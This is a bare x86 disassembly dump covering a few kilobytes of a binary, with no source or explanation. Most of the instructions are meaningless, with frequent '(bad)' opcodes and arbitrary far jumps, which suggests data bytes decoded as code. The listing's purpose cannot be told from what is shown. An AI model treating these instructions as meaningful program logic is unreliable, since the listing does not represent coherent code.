  404d12:	sbb    eax,0x9d588188
  404d17:	cld    
  404d18:	fwait
  404d19:	cmp    eax,0xe6984a00
  404d1e:	test   edx,esi
  404d20:	in     al,0x80
  404d22:	loopne 0x404d74
  404d24:	xchg   ecx,eax
  404d25:	cs push cs
  404d27:	add    BYTE PTR [eax-0x33],bh
  404d2a:	dec    eax
  404d2b:	imul   edx,DWORD PTR [eax],0xffffffd9
  404d2e:	or     eax,0x692418a2
  404d33:	(bad)  
  404d34:	sub    dl,cl
  404d36:	lds    ebp,FWORD PTR [ecx]
  404d38:	repnz or eax,0xf6774ca1
  404d3e:	cwde   
  404d3f:	cmc    
  404d40:	fild   WORD PTR [edx-0x10626f02]
  404d46:	push   eax
  404d47:	jle    0x404dbe
  404d49:	imul   esi,DWORD PTR [esi],0x1b
  404d4c:	lea    ecx,ds:0xd0154d26
  404d52:	inc    eax
  404d53:	sub    BYTE PTR [edi],ah
  404d55:	and    eax,0xba7fc6ee
  404d5a:	xchg   BYTE PTR [ebx+0x1ab169fa],ah
  404d60:	and    ch,bh
  404d62:	aad    0x7f
  404d64:	and    BYTE PTR [ecx+edi*2+0x1df7a891],al
  404d6b:	hlt    
  404d6c:	sub    BYTE PTR [edi+0x2bc803f7],0x91
  404d73:	mov    dx,0x3fb6
  404d77:	mov    BYTE PTR [edx+0x42],ah
  404d7a:	pop    ecx
  404d7b:	in     eax,dx
  404d7c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404d7d:	adc    DWORD PTR [ecx+0x54],esp
  404d80:	cmovle eax,DWORD PTR [esi]
  404d83:	xor    DWORD PTR ds:0xe5dfa919,ebp
  404d89:	arpl   si,cx
  404d8b:	mov    edx,0xde433d00
  404d90:	in     al,dx
  404d91:	lds    esi,FWORD PTR [edi+0x7c6289b6]
  404d97:	outs   dx,DWORD PTR ds:[esi]
  404d98:	pop    ss
  404d99:	test   DWORD PTR [ebx+ebp*8-0x6dbe9f91],edi
  404da0:	dec    eax
  404da1:	sbb    DWORD PTR [ecx],ecx
  404da3:	inc    ecx
  404da4:	das    
  404da5:	mov    ah,0xe6
  404da7:	mov    eax,DWORD PTR [eax-0x18b6b06e]
  404dad:	das    
  404dae:	daa    
  404daf:	rcr    BYTE PTR [edi-0x38788122],cl
  404db5:	mov    ebx,0x5567d870
  404dba:	sub    DWORD PTR [edi+0xf],edi
  404dbd:	xor    BYTE PTR [ecx+esi*1-0x5c2456c9],cl
  404dc4:	push   eax
  404dc5:	(bad)  
  404dc6:	icebp  
  404dc7:	cmp    bh,bh
  404dc9:	and    al,BYTE PTR [edx+0x223f989a]
  404dcf:	jg     0x404d59
  404dd1:	icebp  
  404dd2:	rcr    ebx,0xee
  404dd5:	dec    esp
  404dd6:	lods   al,BYTE PTR ds:[esi]
  404dd7:	test   BYTE PTR [eax+0x6a],al
  404dda:	or     edx,eax
  404ddc:	es (bad) 
  404dde:	nop
  404ddf:	popf   
  404de0:	pop    ds
  404de1:	xchg   BYTE PTR [ecx],bh
  404de3:	cmp    DWORD PTR [eax-0x5d],edi
  404de6:	cmp    esp,DWORD PTR [edx+0x2e73fdd7]
  404dec:	mov    al,0x18
  404dee:	push   cs
  404def:	sub    eax,0x6d7900b6
  404df4:	test   eax,0x328794d1
  404df9:	jle    0x404ded
  404dfb:	daa    
  404dfc:	sahf   
  404dfd:	sbb    DWORD PTR [edi],ecx
  404dff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404e00:	iret   
  404e01:	and    BYTE PTR [esi+0x6b468afc],cl
  404e07:	cli    
  404e08:	shr    eax,cl
  404e0a:	add    eax,0xe08e8073
  404e0f:	fxch   st(7)
  404e11:	mov    al,ds:0x34788ddc
  404e16:	sti    
  404e17:	push   0x6a
  404e19:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404e1a:	xchg   esp,eax
  404e1b:	sbb    dl,dl
  404e1d:	sub    esi,DWORD PTR [ebx]
  404e1f:	repz dec esi
  404e21:	sub    BYTE PTR [ebx+0x5c],0xdf
  404e25:	(bad)  
  404e26:	inc    edi
  404e27:	mov    edi,0xe1a389e5
  404e2c:	xor    al,0xcd
  404e2e:	inc    DWORD PTR [esi-0x5b]
  404e31:	inc    esp
  404e32:	ret    
  404e33:	jge    0x404e1a
  404e35:	(bad)  
  404e36:	fcomp  QWORD PTR [edx+0x87b3aff]
  404e3c:	jg     0x404dd5
  404e3e:	adc    al,0x23
  404e40:	cli    
  404e41:	in     eax,0x17
  404e43:	lods   al,BYTE PTR ds:[esi]
  404e44:	jb     0x404eb8
  404e46:	jae    0x404e97
  404e48:	push   eax
  404e49:	(bad)  
  404e4b:	xor    DWORD PTR [eax],ecx
  404e4d:	jns    0x404dfa
  404e4f:	(bad)  
  404e50:	pop    ds
  404e51:	cwde   
  404e52:	stos   DWORD PTR es:[edi],eax
  404e53:	and    al,0xa8
  404e55:	cmp    al,0x0
  404e57:	les    eax,FWORD PTR [edi]
  404e59:	mov    edx,0x299638f
  404e5e:	inc    ebx
  404e5f:	cld    
  404e60:	jge    0x404ee1
  404e62:	jp     0x404e20
  404e64:	aad    0x2e
  404e66:	ficomp WORD PTR [edx-0xb8eeace]
  404e6c:	dec    edi
  404e6d:	test   ebp,esp
  404e6f:	push   edx
  404e70:	stos   DWORD PTR es:[edi],eax
  404e71:	mov    ch,0x1c
  404e73:	pop    ebx
  404e74:	ficom  WORD PTR [ecx+edi*4-0x4c]
  404e78:	cmp    DWORD PTR [edi+0x26],ecx
  404e7b:	adc    esp,DWORD PTR [edi-0x51]
  404e7e:	mov    cl,0xec
  404e80:	ret    
  404e81:	sub    bh,bl
  404e83:	out    dx,eax
  404e84:	or     al,dl
  404e86:	push   esi
  404e87:	or     esi,eax
  404e89:	add    cl,al
  404e8b:	popa   
  404e8c:	pop    ds
  404e8d:	fcomp  DWORD PTR [ecx]
  404e8f:	mov    dl,0xfa
  404e91:	mov    esp,0xeae9b371
  404e96:	fnstcw WORD PTR [esi]
  404e98:	jle    0x60f1fa69
  404e9e:	jae    0x404ee4
  404ea0:	push   edi
  404ea1:	add    eax,0xbc7f2cee
  404ea6:	ds popa 
  404ea8:	call   0xd437:0x472a44d9
  404eaf:	leave  
  404eb0:	loopne 0x404f03
  404eb2:	add    al,0x54
  404eb4:	daa    
  404eb5:	fwait
  404eb6:	test   BYTE PTR [ebx+0x9efe01],ah
  404ebc:	pop    esi
  404ebd:	pop    edi
  404ebe:	adc    dh,bl
  404ec0:	call   0xcc90:0x915b75b9
  404ec7:	adc    eax,DWORD PTR [edx]
  404ec9:	ja     0x404e74
  404ecb:	icebp  
  404ecc:	js     0x404e96
  404ece:	inc    esi
  404ecf:	imul   edi,esp,0xabc1222e
  404ed5:	ds je  0x404ee1
  404ed8:	ficom  DWORD PTR fs:[eax]
  404edb:	sbb    esp,DWORD PTR [ebx+0x4ea3ff86]
  404ee1:	mov    ds:0xa8ca1e9a,al
  404ee6:	and    ecx,DWORD PTR [esi+0x74464d49]
  404eec:	lods   al,BYTE PTR ds:[esi]
  404eed:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404eef:	and    al,0x51
  404ef1:	adc    eax,0xc77cdfcd
  404ef6:	pop    es
  404ef7:	das    
  404ef8:	shl    BYTE PTR [eax+0x62],1
  404efb:	xor    eax,0xc58bffa5
  404f00:	fstp   DWORD PTR [eax]
  404f02:	jmp    0x79f9f107
  404f07:	push   ecx
  404f08:	retf   0x1f2d
  404f0b:	xor    al,0xe8
  404f0d:	shl    BYTE PTR [ecx-0x28bb5f26],0xbf
  404f14:	cwde   
  404f15:	arpl   di,ax
  404f17:	jmp    0x8ce06f0c
  404f1c:	repnz dec edx
  404f1e:	punpckldq mm0,DWORD PTR [eax]
  404f21:	call   0x5045:0xa70767f6
  404f28:	mov    esi,0xdb34c13f
  404f2d:	sub    eax,0x535982c
  404f32:	mov    ecx,0xf16d50fc
  404f37:	mov    bh,0x99
  404f39:	xor    eax,0x47fcdf55
  404f3e:	call   0x7c8f61b2
  404f43:	pop    ss
  404f44:	ja     0x404f38
  404f46:	(bad)  
  404f47:	sub    al,0xce
  404f49:	mov    edx,0x78ab4830
  404f4e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404f4f:	in     al,0x45
  404f51:	adc    BYTE PTR [edx-0x80],bl
  404f54:	and    al,ch
  404f56:	jge    0x404ee8
  404f58:	jbe    0x404f7a
  404f5a:	jmp    0x54826355
  404f5f:	pop    eax
  404f60:	std    
  404f61:	retf   0x3ef0
  404f64:	cwde   
  404f65:	ja     0x404fc2
  404f67:	pop    es
  404f68:	and    edi,ebp
  404f6a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404f6b:	popa   
  404f6c:	inc    esp
  404f6d:	std    
  404f6e:	xor    edi,ecx
  404f70:	stos   BYTE PTR es:[edi],al
  404f71:	xor    eax,0x7dcfa98f
  404f76:	out    0x3f,al
  404f78:	cmp    BYTE PTR ds:0x625d279b,ah
  404f7e:	mov    WORD PTR [ecx+ecx*4],ss
  404f81:	icebp  
  404f82:	sti    
  404f83:	mov    edx,0x793400ee
  404f88:	icebp  
  404f89:	aad    0x85
  404f8b:	and    DWORD PTR [ecx+esi*4+0x58],esp
  404f8f:	repz clc 
  404f91:	sbb    eax,0x795a7afe
  404f96:	jecxz  0x404f4a
  404f98:	mov    ebx,0x160b0d69
  404f9d:	push   cs
  404f9e:	mov    al,0x8
  404fa0:	ret    
  404fa1:	mov    eax,ds:0xc60cc186
  404fa6:	fwait
  404fa7:	cmp    al,0x5c
  404fa9:	(bad)  
  404faa:	loop   0x404f47
  404fac:	stc    
  404fad:	cwde   
  404fae:	(bad)  
  404faf:	jne    0x405013
  404fb1:	ss pop ecx
  404fb3:	push   ss
  404fb4:	icebp  
  404fb5:	push   eax
  404fb6:	dec    esp
  404fb7:	inc    esi
  404fb8:	and    al,0x16
  404fba:	std    
  404fbb:	aad    0xaa
  404fbd:	jno    0x404f5f
  404fbf:	fistp  DWORD PTR ds:0xb32c76de
  404fc5:	mov    ecx,0x8106a92b
  404fca:	xchg   edx,eax
  404fcb:	xor    BYTE PTR [edx-0x1a],cl
  404fce:	mul    DWORD PTR [edx+0x1]
  404fd1:	dec    ecx
  404fd2:	or     DWORD PTR [ebx+0x35c2e55],ecx
  404fd8:	mov    bl,0x3e
  404fda:	sub    bh,BYTE PTR [ebx+0x1c]
  404fdd:	pop    ecx
  404fde:	aas    
  404fdf:	pop    ecx
  404fe0:	stos   DWORD PTR es:[edi],eax
  404fe1:	mul    BYTE PTR [ecx+0x49125f0]
  404fe7:	outs   dx,DWORD PTR ds:[esi]
  404fe8:	push   edx
  404fe9:	test   eax,0xfeae7500
  404fee:	int    0xc8
  404ff0:	in     al,0x4b
  404ff2:	popa   
  404ff3:	out    dx,al
  404ff4:	or     DWORD PTR fs:[esi],eax
  404ff7:	xor    ebx,edx
  404ff9:	out    0x3,eax
  404ffb:	(bad)  
  404ffc:	(bad)  
  404ffe:	add    esp,DWORD PTR [edx-0x27]
  405001:	out    0x3,eax
  405003:	(bad)  
  405004:	(bad)  
  405006:	add    esp,DWORD PTR [edx-0x27]
  405009:	out    0x3,eax
  40500b:	(bad)  
  40500c:	(bad)  
  40500e:	add    esp,DWORD PTR [edx-0x27]
  405011:	out    0x3,eax
  405013:	(bad)  
  405014:	(bad)  
  405016:	add    esp,DWORD PTR [edx-0x27]
  405019:	call   0xe919b221
  40501e:	add    esp,DWORD PTR [edx-0x27]
  405021:	call   0xe919b229
  405026:	add    esp,DWORD PTR [edx-0x27]
  405029:	jmp    0xea19b231
  40502e:	add    esp,DWORD PTR [edx-0x27]
  405031:	jmp    0xea19b239
  405036:	add    esp,DWORD PTR [edx-0x27]
  405039:	jmp    0x6203:0xead96203
  405040:	fldl2e 
  405042:	add    esp,DWORD PTR [edx-0x27]
  405045:	jmp    0x6203:0xebd96203
  40504c:	(bad)  
  40504e:	add    eax,DWORD PTR [eax]
  405050:	(bad)  
  405051:	fldpi  
  405053:	add    esp,DWORD PTR [edx-0x27]
  405056:	jecxz  0x40505b
  405058:	(bad)  
  405059:	fldlg2 
  40505b:	add    esp,DWORD PTR [edx-0x27]
  40505e:	in     al,0x3
  405060:	(bad)  
  405061:	fldlg2 
  405063:	add    esp,DWORD PTR [edx-0x27]
  405066:	in     al,0x3
  405068:	(bad)  
  405069:	(bad)  
  40506b:	add    esp,DWORD PTR [edx-0x27]
  40506e:	xlat   BYTE PTR ds:[ebx]
  40506f:	bnd jae 0x40504b
  405072:	add    cl,ah
  405074:	pop    esi
  405075:	loop   0x40507d
  405077:	jecxz  0x4050dd
  405079:	loopne 0x40507f
  40507b:	cmc    
  40507c:	(bad)  
  40507d:	out    0x2,al
  40507f:	out    dx,eax
  405080:	pusha  
  405081:	in     al,0x0
  405083:	jmp    0xe94129e9
  405088:	popa   
  405089:	fld    DWORD PTR [eax]
  40508b:	jmp    0xe94129f1
  405090:	popa   
  405091:	fld    DWORD PTR [eax]
  405093:	call   0xe84129f9
  405098:	popa   
  405099:	fld    DWORD PTR [eax]
  40509b:	jmp    0x4050fe
  40509d:	fld    DWORD PTR [eax]
  40509f:	jmp    0x405102
  4050a1:	fld    DWORD PTR [eax]
  4050a3:	jmp    0xd961:0xea00d961
  4050aa:	add    ch,ch
  4050ac:	popa   
  4050ad:	fld    DWORD PTR [eax]
  4050af:	in     eax,0x61
  4050b1:	fld    DWORD PTR [eax]
  4050b3:	in     al,dx
  4050b4:	add    BYTE PTR [ecx-0x27],ah
  4050b7:	add    ah,ah
  4050b9:	popa   
  4050ba:	fld    DWORD PTR [eax]
  4050bc:	out    dx,eax
  4050bd:	popa   
  4050be:	fld    DWORD PTR [eax]
  4050c0:	out    0x61,eax
  4050c2:	fld    DWORD PTR [eax]
  4050c4:	out    dx,al
  4050c5:	popa   
  4050c6:	fld    DWORD PTR [eax]
  4050c8:	out    0x61,al
  4050ca:	fld    DWORD PTR [eax]
  4050cc:	icebp  
  4050cd:	popa   
  4050ce:	fld    DWORD PTR [eax]
  4050d0:	icebp  
  4050d1:	popa   
  4050d2:	fld    DWORD PTR [eax]
  4050d4:	loopne 0x405137
  4050d6:	fld    DWORD PTR [eax]
  4050d8:	loopne 0x40513b
  4050da:	fld    DWORD PTR [eax]
  4050dc:	repz popa 
  4050de:	fld    DWORD PTR [eax]
  4050e0:	repz popa 
  4050e2:	fld    DWORD PTR [eax]
  4050e4:	loop   0x405147
  4050e6:	fld    DWORD PTR [eax]
  4050e8:	loop   0x40514b
  4050ea:	fld    DWORD PTR [eax]
  4050ec:	add    BYTE PTR [edi-0x29],cl
  4050ef:	add    BYTE PTR [eax],al
  4050f1:	aas    
  4050f2:	xlat   BYTE PTR ds:[ebx]
  4050f3:	add    BYTE PTR [eax],al
  4050f5:	xlat   BYTE PTR ds:[ebx]
  4050f7:	add    BYTE PTR [eax],al
  4050f9:	push   ds
  4050fa:	xlat   BYTE PTR ds:[ebx]
  4050fb:	add    BYTE PTR [eax],al
  4050fd:	dec    ebx
  4050fe:	xlat   BYTE PTR ds:[ebx]
  4050ff:	add    BYTE PTR [eax],al
  405101:	cmp    edx,edi
  405103:	add    BYTE PTR [eax],al
  405105:	cmp    edx,edi
  405107:	add    BYTE PTR [eax],al
  405109:	or     edx,edi
  40510b:	add    BYTE PTR [eax],al
  40510d:	or     edx,edi
  40510f:	add    BYTE PTR [eax],al
  405111:	sti    
  405112:	(bad)  
  405113:	add    BYTE PTR [eax],al
  405115:	sti    
  405116:	(bad)  
  405117:	add    BYTE PTR [eax],al
  405119:	add    BYTE PTR [ebx],cl
  40511b:	xlat   BYTE PTR ds:[ebx]
  40511c:	add    BYTE PTR [eax],al
  40511e:	or     edx,edi
  405120:	add    BYTE PTR [eax],al
  405122:	sti    
  405123:	(bad)  
  405124:	add    BYTE PTR [eax],al
  405126:	sti    
  405127:	(bad)  
  405128:	add    BYTE PTR [eax],al
  40512a:	retf   
  40512b:	(bad)  
  40512c:	add    BYTE PTR [eax],al
  40512e:	retf   
  40512f:	(bad)  
  405130:	add    BYTE PTR [eax],al
  405132:	mov    ebx,0xbb0000d6
  405137:	(bad)  
  405138:	add    BYTE PTR [eax],al
  40513a:	retf   
  40513b:	(bad)  
  40513c:	add    BYTE PTR [eax],al
  40513e:	leave  
  40513f:	(bad)  
  405140:	add    BYTE PTR [eax],al
  405142:	mov    eax,0xb40000d6
  405147:	(bad)  
  405148:	add    BYTE PTR [eax],al
  40514a:	mov    edx,esi
  40514c:	add    BYTE PTR [eax],al
  40514e:	(bad)  
  40514f:	(bad)  
  405150:	or     BYTE PTR [eax],al
  405152:	(bad)  
  405153:	fmul   QWORD PTR [eax]
  405155:	add    BYTE PTR [edi],bh
  405157:	fisttp QWORD PTR [eax]
  405159:	add    bh,bl
  40515b:	fisttp QWORD PTR [eax]
  40515d:	add    BYTE PTR [edi+0x1f0008d6],cl
  405163:	fisttp QWORD PTR [eax]
  405165:	add    BYTE PTR [edx-0x24],ah
  405168:	add    al,0x8
  40516a:	bound  esi,QWORD PTR [eax*1+0x2bc6208]
  405171:	or     BYTE PTR [edx+0x14],ah
  405174:	add    eax,0x4cc6208
  405179:	or     BYTE PTR [edx+0x64],ah
  40517c:	add    eax,0xfc620008
  405181:	add    al,0x8
  405183:	bound  edx,QWORD PTR [ebp+eax*1+0x8]
  405187:	bound  ecx,QWORD PTR [edx+eax*1+0x5246208]
  40518e:	or     BYTE PTR [edx-0x42],ah
  405191:	add    cl,BYTE PTR [eax]
  405193:	bound  edi,QWORD PTR [esi]
  405195:	add    eax,0x27e6208
  40519a:	or     BYTE PTR [edx-0x2],ah
  40519d:	add    al,0x8
  40519f:	bound  ebx,QWORD PTR [esi+0x1e620802]
  4051a5:	add    eax,0x25e6208
  4051aa:	or     BYTE PTR [edx-0x22],ah
  4051ad:	add    al,0x8
  4051af:	bound  ecx,QWORD PTR [esi+0xe620802]
  4051b5:	add    eax,0x24e6208
  4051ba:	or     BYTE PTR [edx-0x32],ah
  4051bd:	add    al,0x8
  4051bf:	(bad)  
  4051c0:	into   
  4051c1:	add    al,0x8
  4051c3:	bound  ecx,QWORD PTR [esi+0x2]
  4051c6:	or     BYTE PTR [edx+0xe],ah
  4051c9:	add    eax,0x28e6208
  4051ce:	or     BYTE PTR [edx-0x5a],ah
  4051d1:	add    cl,BYTE PTR [eax]
  4051d3:	bound  esp,QWORD PTR [esi]
  4051d5:	add    cl,BYTE PTR [eax]
  4051d7:	(bad)  
  4051d8:	test   BYTE PTR [eax+ecx*1],0x62
  4051dc:	jbe    0x4051e0
  4051de:	or     BYTE PTR [edx-0x27],ah
  4051e1:	rol    DWORD PTR [ebx],1
  4051e3:	add    BYTE PTR [edx-0x27],bl
  4051e6:	push   ecx
  4051e7:	add    ebx,DWORD PTR [edx-0x27]
  4051ea:	add    DWORD PTR [edx+ebp*2],eax
  4051ed:	fld    DWORD PTR [ecx-0x1e2695fd]
  4051f3:	add    ebx,DWORD PTR [edx-0x27]
  4051f6:	popa   
  4051f7:	add    ebx,DWORD PTR [edx-0x27]
  4051fa:	adc    DWORD PTR [edx+ebp*2],eax
  4051fd:	fst    DWORD PTR [ecx+0x21d96a03]
  405203:	add    al,0x5a
  405205:	fldenv [ecx-0x2e26a5fd]
  40520b:	add    ebp,DWORD PTR [edx-0x27]
  40520e:	push   ecx
  40520f:	add    ebp,DWORD PTR [edx-0x27]
  405212:	in     eax,dx
  405213:	add    ebx,DWORD PTR [edx-0x27]
  405216:	add    ebx,DWORD PTR gs:[edx-0x27]
  40521a:	lods   eax,DWORD PTR ds:[esi]
  40521b:	add    ebp,DWORD PTR [edx-0x27]
  40521e:	and    eax,0xcdd96a03
  405223:	add    ebx,DWORD PTR [edx-0x27]
  405226:	inc    ebp
  405227:	add    ebx,DWORD PTR [edx-0x27]
  40522a:	lea    eax,[ebx]
  40522c:	push   0xffffffd9
  40522e:	add    eax,0xddd96a03
  405233:	add    ebx,DWORD PTR [edx-0x27]
  405236:	push   ebp
  405237:	add    ebx,DWORD PTR [edx-0x27]
  40523a:	popf   
  40523b:	add    ebp,DWORD PTR [edx-0x27]
  40523e:	adc    eax,0x1dd96a03
  405243:	add    al,0x5a
  405245:	fst    DWORD PTR [ebp-0x26a5fffc]
  40524b:	pop    ebp
  40524c:	add    al,0x6a
  40524e:	(bad)  
  405250:	add    al,0x6a
  405252:	fprem1 
  405254:	add    ebx,DWORD PTR [edx-0x27]
  405257:	ins    DWORD PTR es:[edi],dx
  405258:	add    al,0x5a
  40525a:	fld    DWORD PTR [eax]
  40525c:	daa    
  40525d:	data16 loope 0x405260
  405260:	lahf   
  405261:	pop    esi
  405262:	loope  0x405264
  405264:	xlat   BYTE PTR ds:[ebx]
  405265:	popa   
  405266:	loope  0x405268
  405268:	dec    edi
  405269:	pop    esi
  40526a:	loope  0x40526c
  40526c:	pop    es
  40526d:	data16 loope 0x405270
  405270:	jg     0x4052d0
  405272:	loope  0x405274
  405274:	out    0x61,eax
  405276:	loope  0x405278
  405278:	pop    edi
  405279:	pop    esi
  40527a:	loope  0x40527c
  40527c:	pop    ss
  40527d:	data16 loope 0x405280
  405280:	(bad)  
  405281:	pop    esi
  405282:	loope  0x405284
  405284:	daa    
  405285:	data16 loope 0x405288
  405288:	lahf   
  405289:	pop    esi
  40528a:	loope  0x40528c
  40528c:	xlat   BYTE PTR ds:[ebx]
  40528d:	popa   
  40528e:	loope  0x405290
  405290:	dec    edi
  405291:	pop    esi
  405292:	loope  0x405294
  405294:	call   0x684133fa
  405299:	pop    esi
  40529a:	loope  0x40529c
  40529c:	test   al,0x61
  40529e:	loope  0x4052a0
  4052a0:	sub    BYTE PTR [esi-0x1f],bl
  4052a3:	add    al,cl
  4052a5:	popa   
  4052a6:	loope  0x4052a8
  4052a8:	dec    eax
  4052a9:	pop    esi
  4052aa:	loope  0x4052ac
  4052ac:	mov    BYTE PTR [eax],al
  4052ae:	popa   
  4052af:	loope  0x4052b1
  4052b1:	or     BYTE PTR [esi-0x1f],bl
  4052b4:	add    al,bl
  4052b6:	popa   
  4052b7:	loope  0x4052b9
  4052b9:	pop    eax
  4052ba:	pop    esi
  4052bb:	loope  0x4052bd
  4052bd:	cwde   
  4052be:	popa   
  4052bf:	loope  0x4052c1
  4052c1:	sbb    BYTE PTR [esi-0x1f],bl
  4052c4:	add    BYTE PTR [eax],bl
  4052c6:	data16 loope 0x4052c9
  4052c9:	cwde   
  4052ca:	popa   
  4052cb:	loope  0x4052cd
  4052cd:	pop    eax
  4052ce:	data16 loope 0x4052d1
  4052d1:	fsub   DWORD PTR [ecx-0x1f]
  4052d4:	add    BYTE PTR [eax],al
  4052d6:	xchg   edx,eax
  4052d7:	fisttp DWORD PTR [eax]
  4052d9:	add    BYTE PTR [edx],dl
  4052db:	fmul   QWORD PTR [eax]
  4052dd:	add    BYTE PTR [edx-0x2b],al
  4052e0:	or     BYTE PTR [eax],al
  4052e2:	ret    0x8db
  4052e5:	add    BYTE PTR [edx+0x120008db],dl
  4052eb:	fmul   QWORD PTR [eax]
  4052ed:	add    BYTE PTR [edx-0x2b],ah
  4052f0:	or     BYTE PTR [eax],al
  4052f2:	loop   0x4052ce
  4052f4:	or     BYTE PTR [eax],al
  4052f6:	inc    edx
  4052f7:	fisttp DWORD PTR [eax]
  4052f9:	add    dl,al
  4052fb:	fimul  DWORD PTR [eax]
  4052fd:	add    BYTE PTR [edx-0x2b],dl
  405300:	or     BYTE PTR [eax],al
  405302:	rcr    dl,cl
  405304:	or     BYTE PTR [eax],al
  405306:	adc    ch,0x8
  405309:	add    BYTE PTR [edx],al
  40530b:	fisttp DWORD PTR [eax]
  40530d:	add    BYTE PTR [edx],dh
  40530f:	fisttp DWORD PTR [eax]
  405311:	add    BYTE PTR [eax],al
  405313:	mov    dl,0xda
  405315:	or     BYTE PTR [eax],al
  405317:	(bad)  
  405318:	fimul  DWORD PTR [eax]
  40531a:	add    BYTE PTR [esi-0x26],bh
  40531d:	or     BYTE PTR [eax],al
  40531f:	into   
  405320:	fimul  DWORD PTR [eax]
  405322:	add    BYTE PTR [esi],bh
  405324:	fimul  DWORD PTR [eax]
  405326:	add    BYTE PTR [esi],bl
  405328:	fisttp DWORD PTR [eax]
  40532a:	add    BYTE PTR [esi-0x11fff726],bl
  405330:	fimul  DWORD PTR [eax]
  405332:	add    BYTE PTR [esi-0x26],bl
  405335:	or     BYTE PTR [eax],al
  405337:	scas   al,BYTE PTR es:[edi]
  405338:	fimul  DWORD PTR [eax]
  40533a:	add    BYTE PTR [esi],ch
  40533c:	fimul  DWORD PTR [eax]
  40533e:	add    dh,bl
  405340:	fimul  DWORD PTR [eax]
  405342:	add    BYTE PTR [esi-0x26],cl
  405345:	or     BYTE PTR [eax],al
  405347:	dec    esi
  405348:	aad    0x8
  40534a:	add    dh,cl
  40534c:	aad    0x8
  40534e:	add    BYTE PTR [edx+0xd],ah
  405351:	add    eax,0x5856208
  405356:	or     BYTE PTR [edx-0x5b],ah
  405359:	add    cl,BYTE PTR [eax]
  40535b:	bound  edi,QWORD PTR ds:0xf5620805
  405361:	add    al,0x8
  405363:	bound  ecx,QWORD PTR [ebp+0x5]
  405366:	or     BYTE PTR [edx-0x7b],ah
  405369:	add    cl,BYTE PTR [eax]
  40536b:	bound  ebx,QWORD PTR ds:0xd5620805
  405371:	add    al,0x8
  405373:	bound  ebp,QWORD PTR ds:0x62000805
  405379:	mov    ch,0x2
  40537b:	or     BYTE PTR [edx+0xd],ah
  40537e:	add    eax,0x4c56208
  405383:	or     BYTE PTR [edx+0x5d],ah
  405386:	add    eax,0x4f56208
  40538b:	or     BYTE PTR [edx+0x4d],ah
  40538e:	add    eax,0x2856208
  405393:	or     BYTE PTR [edx+0x1d],ah
  405396:	add    eax,0x2936208
  40539b:	or     DWORD PTR [edx-0x6d],esp
  40539e:	add    eax,0x5136209
  4053a3:	or     DWORD PTR [edx+0x13],esp
  4053a6:	add    al,0x9
  4053a8:	bound  esi,QWORD PTR [ebx+0x2]
  4053ab:	or     DWORD PTR [edx+0x73],esp
  4053ae:	add    eax,0x4f36209
  4053b3:	or     DWORD PTR [edx-0xd],esp
  4053b6:	add    ecx,DWORD PTR [ecx]
  4053b8:	bound  esi,QWORD PTR [ebx+0x2]
  4053bb:	or     DWORD PTR [edx+0x73],esp
  4053be:	add    eax,0x4f36209
  4053c3:	or     DWORD PTR [edx-0xd],esp
  4053c6:	add    ecx,DWORD PTR [ecx]
  4053c8:	(bad)  
  4053c9:	fstp   DWORD PTR [edx+0x4]
  4053cc:	pop    ebx
  4053cd:	fstp   DWORD PTR [edx+0x5]
  4053d0:	imul   ebx,ecx,0xffffffda
  4053d3:	add    ebp,DWORD PTR [ebx-0x27]
  4053d6:	fiadd  DWORD PTR [ebx+ebx*2]
  4053d9:	fptan  
  4053db:	add    eax,DWORD PTR [eax]
  4053dd:	pop    ebx
  4053de:	fptan  
  4053e0:	add    al,0x6b
  4053e2:	fldenv [edx+0x3]
  4053e5:	imul   ebx,ecx,0x62
  4053e8:	add    al,0x5b
  4053ea:	fnstenv [edx]
  4053ec:	add    al,0x5b
  4053ee:	fnstenv [edx]
  4053f0:	add    eax,0x3a2d96b
  4053f5:	imul   ebx,ecx,0xffffffa2
  4053f8:	add    al,0x5b
  4053fa:	(bad)  
  4053fc:	add    ebx,DWORD PTR [ebx-0x27]
  4053ff:	rol    BYTE PTR [ebx+ebp*2],cl
  405402:	fld    DWORD PTR [edx+0x3]
  405405:	imul   ebx,ecx,0x42
  405408:	add    al,0x5b
  40540a:	(bad)  
  40540c:	add    ebx,DWORD PTR [ebx-0x27]
  40540f:	rol    BYTE PTR [ebx+ebp*2],cl
  405412:	fld    DWORD PTR [edx+0x3]
  405415:	imul   ebx,ecx,0x42
  405418:	add    al,0x5b
  40541a:	(bad)  
  40541c:	add    ebx,DWORD PTR [ebx-0x27]
  40541f:	loop   0x405425
  405421:	imul   ebx,ecx,0x52
  405424:	add    ebp,DWORD PTR [ebx-0x27]
  405427:	push   edx
  405428:	add    al,0x5b
  40542a:	fld    st(2)
  40542c:	add    ebx,DWORD PTR [ebx-0x27]
  40542f:	ret    0x6b04
  405432:	fnstenv [edx]
  405434:	add    ebp,DWORD PTR [ebx-0x27]
  405437:	xor    al,BYTE PTR [ebx+ebx*2]
  40543a:	fld    st(2)
  40543c:	add    ebx,DWORD PTR [ebx-0x27]
  40543f:	ret    0x4
  405442:	imul   ebx,ecx,0x0
  405445:	xor    ah,BYTE PTR [ecx-0x1e]
  405448:	add    BYTE PTR [edx],dh
  40544a:	data16 loop 0x40544d
  40544d:	bound  ebx,QWORD PTR [esi-0x1e]
  405450:	add    BYTE PTR [edx+0x61],ah
  405453:	loop   0x405455
  405455:	rcr    BYTE PTR [esi-0x1e],cl
  405458:	add    dl,dl
  40545a:	popa   
  40545b:	loop   0x40545d
  40545d:	out    dx,al
  40545e:	popa   
  40545f:	loop   0x405461
  405461:	out    0x60,al
  405463:	loop   0x405465
  405465:	outs   dx,BYTE PTR ds:[esi]
  405466:	pop    esi
  405467:	loop   0x405469
  405469:	popaw  
  40546b:	loop   0x40546d
  40546d:	cs pop esi
  40546f:	loop   0x405471
  405471:	es popa 
  405473:	loop   0x405475
  405475:	scas   al,BYTE PTR es:[edi]
  405476:	pop    esi
  405477:	loop   0x405479
  405479:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40547a:	popa   
  40547b:	loop   0x40547d
  40547d:	into   
  40547e:	popa   
  40547f:	loop   0x405481
  405481:	(bad)  
  405482:	pusha  
  405483:	loop   0x405485
  405485:	dec    esi
  405486:	pop    esi
  405487:	loop   0x405489
  405489:	inc    esi
  40548a:	popa   
